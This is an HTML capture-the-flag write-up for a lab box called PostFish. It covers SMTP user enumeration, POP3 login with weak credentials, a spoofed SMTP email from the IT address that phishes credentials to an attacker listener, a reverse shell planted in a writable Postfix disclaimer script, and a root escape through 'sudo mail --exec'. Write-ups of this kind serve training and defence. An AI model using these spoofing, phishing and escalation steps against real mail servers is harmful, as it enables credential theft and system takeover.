@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PostFish &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>PostFish</h1>
+    <div class="meta">Target: <code>192.168.183.137</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">SMTP</span><span class="tag">Phishing</span><span class="tag">POP3</span><span class="tag">CewL</span><span class="tag">CredentialInterception</span><span class="tag">PostfixDisclaimer</span><span class="tag">FilterGroup</span><span class="tag">GTFOBins</span><span class="tag">mail</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#smtp-user-enumeration">SMTP User Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#pop3-mailbox-access">POP3 Mailbox Access</a><a class="lvl3" href="#credential-interception-via-smtp-phishing">Credential Interception via SMTP Phishing</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#postfix-disclaimer-script-injection">Postfix Disclaimer Script Injection</a><a class="lvl3" href="#gtfobins-mail-with-sudo">GTFOBins: mail with sudo</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>PostFish is a Linux box that chains social engineering through actual mail infrastructure into a privilege escalation via an abusable Postfix hook. The path starts with SMTP user enumeration and POP3 mailbox access, escalates through a crafted phishing email that tricks an automated system into POSTing credentials to an attacker-controlled listener, and finally abuses group membership in <code>filter</code> to inject a reverse shell into Postfix's disclaimer script, then escapes to root via <code>mail</code> with a GTFOBins sudo trick.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT    STATE SERVICE
+22/tcp  open  ssh
+25/tcp  open  smtp
+80/tcp  open  http
+110/tcp open  pop3
+143/tcp open  imap
+993/tcp open  imaps
+995/tcp open  pop3s
+</code></pre>
+<p>The web app redirects to <code>http://postfish.off/</code> (added to <code>/etc/hosts</code>). The landing page lists company staff:</p>
+<pre><code>Claire Madison  - HR Specialist
+Mike Ross       - IT Pro
+Brian Moore     - Sales Manager
+Sarah Lorem     - Legal Advisor
+</code></pre>
+<h3 id="smtp-user-enumeration">SMTP User Enumeration</h3>
+<p>Running <code>smtp-user-enum</code> against standard system accounts confirmed many exist. A CeWL wordlist built from the website's content found two more:</p>
+<pre><code>192.168.183.137: Sales exists
+192.168.183.137: Legal exists
+</code></pre>
+<blockquote>
+<p><strong>Why CeWL helps here:</strong> <code>smtp-user-enum</code> only confirms or denies names you give it. CeWL scrapes the target site and builds a wordlist from its own content, department names, staff names, product words. Companies frequently use department names as mail aliases, and "Sales" proved to be one here.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="pop3-mailbox-access">POP3 Mailbox Access</h3>
+<p><code>sales:sales</code> authenticated to the POP3 service:</p>
+<pre><code class="language-sh">telnet 192.168.183.137 110
+USER sales
++OK
+PASS sales
++OK Logged in.
+</code></pre>
+<p>Reading the single email in the inbox reveals a message from <code>it@postfish.off</code> mentioning upcoming password reset links sent to the Sales team.</p>
+<h3 id="credential-interception-via-smtp-phishing">Credential Interception via SMTP Phishing</h3>
+<p>The password reset system is automated: send an email from <code>it@postfish.off</code> to a user with a link, and the target's browser or mail client follows it, POSTing credentials. Setting up a netcat listener on port 80, then sending a crafted email spoofing IT to <code>brian.moore@postfish.off</code>:</p>
+<pre><code class="language-sh">nc -v postfish.off 25
+220 postfish.off ESMTP Postfix (Ubuntu)
+helo test
+250 postfish.off
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+RCPT TO: brian.moore@postfish.off
+250 2.1.5 Ok
+DATA
+354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+Subject: Password reset process
+
+Hi Brian,
+
+Please follow this link to reset your password: http://192.168.45.244/
+
+Regards,
+
+.
+250 2.0.0 Ok: queued as 75D8745441
+QUIT
+</code></pre>
+<blockquote>
+<p><strong>Why SMTP spoofing works here:</strong> Postfix on this box accepted mail from any <code>MAIL FROM</code> address without authentication. Many internal mail systems trust that senders are who they claim to be, especially from <code>localhost</code> or internal networks. This lets an attacker impersonate any address the system will relay.</p>
+</blockquote>
+<p>The listener catches an HTTP POST from the server containing Brian's credentials in the form body:</p>
+<pre><code class="language-sh">sudo rlwrap nc -lvnp 80
+...
+first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%40postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confirm_password%3DEternaLSunshinE
+</code></pre>
+<p>Credentials extracted:</p>
+<pre><code>brian.moore : EternaLSunshinE
+</code></pre>
+<p>SSH access works:</p>
+<pre><code class="language-sh">ssh brian.moore@192.168.183.137
+brian.moore@postfish:~$
+</code></pre>
+<p>Local flag:</p>
+<pre><code class="language-sh">brian.moore@postfish:~$ cat local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="postfix-disclaimer-script-injection">Postfix Disclaimer Script Injection</h3>
+<p>LinPEAS flags a file readable to <code>brian.moore</code> but not world-readable:</p>
+<pre><code>/etc/postfix/disclaimer
+</code></pre>
+<p>Researching Postfix disclaimers: when a <code>disclaimer_address</code> is configured, any email passing through the server triggers <code>/etc/postfix/disclaimer</code>, which appends the contents of <code>disclaimer.txt</code> to the message. The <code>brian.moore</code> user is a member of the <code>filter</code> group, which has write access to this file.</p>
+<p>Adding a bash reverse shell to the top of <code>/etc/postfix/disclaimer</code> using <code>nano</code>, then triggering it by sending any email through the server:</p>
+<pre><code class="language-sh">nc -v postfish.off 25
+MAIL FROM: it@postfish.off
+RCPT TO: brian.moore@postfish.off
+DATA
+Shell please!
+.
+</code></pre>
+<p>Shell arrives as user <code>filter</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [192.168.45.244] from (UNKNOWN) [192.168.183.137] 58538
+filter@postfish:/var/spool/postfix$ whoami
+filter
+</code></pre>
+<h3 id="gtfobins-mail-with-sudo">GTFOBins: mail with sudo</h3>
+<pre><code class="language-sh">User filter may run the following commands on postfish:
+    (ALL) NOPASSWD: /usr/bin/mail *
+</code></pre>
+<p>GTFOBins documents that <code>mail</code> can spawn an interactive shell via its <code>--exec</code> flag:</p>
+<pre><code class="language-sh">sudo mail --exec='!/bin/sh'
+whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">cd /root
+cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Real mail infrastructure is a phishing target.</strong> An unauthenticated SMTP relay let an attacker impersonate IT and capture credentials through the server's own automated password reset flow.</li>
+<li><strong>Group membership determines what scripts you can modify.</strong> Membership in <code>filter</code> isn't glamorous, but write access to a Postfix hook script means any email delivery becomes a code execution trigger.</li>
+<li><strong>GTFOBins covers a lot of <code>sudo</code> entries.</strong> <code>mail</code>, <code>less</code>, <code>awk</code>, <code>find</code>, and hundreds of other binaries can escalate privileges when run with sudo. Check every binary in <code>sudo -l</code> output.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
